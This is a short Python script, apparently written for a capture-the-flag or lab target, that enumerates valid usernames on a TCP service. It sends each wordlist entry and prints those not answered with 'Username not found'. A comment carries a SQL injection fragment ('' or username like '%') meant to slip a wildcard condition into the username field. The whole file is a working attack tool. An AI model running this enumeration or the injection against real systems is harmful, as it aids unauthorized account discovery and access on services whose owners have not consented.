import socket
import argparse
import sys


def main(ip,port,wordlist):
    with open(wordlist,'r') as f:
        for linea in f:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip,port))
                s.recv(1024).decode('utf-8')
                s.recv(1024).decode('utf-8')
    
                if f"{linea.strip().encode('utf-8')}" == b'':
                    continue

                s.sendall(f'{linea.strip()}\n'.encode('utf-8'))
                response = s.recv(1024).decode('utf-8')
                if "Username not found" in response:
                    continue
                print("user:",linea.strip(),"\t",response,end='')
                
#' or username like '%

def help():
    print(f"[Uso correcto]\n\t{sys.argv[0]} [IP] [PORT] [WORDLIST]")
    exit()

if __name__ == "__main__":

    if len(sys.argv[1:]) != 3:
        help()
    ip = sys.argv[1]
    port = int(sys.argv[2])
    wordlist = sys.argv[3]
    main(ip,port,wordlist)
